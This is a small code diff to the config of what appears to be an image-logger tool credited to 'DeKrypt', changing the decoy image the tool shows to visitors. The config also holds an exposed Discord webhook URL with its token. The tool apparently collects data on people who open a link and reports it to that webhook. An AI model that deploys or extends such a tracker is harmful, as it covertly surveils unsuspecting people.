@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335315120733028352/Xorf3mNgNx3w7pbUE1mzmR6Uvj3kUQEFY5bBztqfu6qJ6uP6dCOLIBd5la1a1fLhjjuD",
-    "image": "https://imgs.search.brave.com/jpan7wJ866SwtJhi5tz0utMwcAlVpjPaw5k8AgyQ65w/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMudGVjaGhpdmUu/Y29tL2ltYWdlcy9h/cnRpY2xlLzIwMTQv/MDQvd2luZG93cy14/cC1ibGlzcy1kZXNr/dG9wLWltYWdlLTEw/MDI1OTg4OC1sYXJn/ZS5qcGc_YXV0bz13/ZWJwJnF1YWxpdHk9/ODUsNzA", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/nQ7BpA7cwf6.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
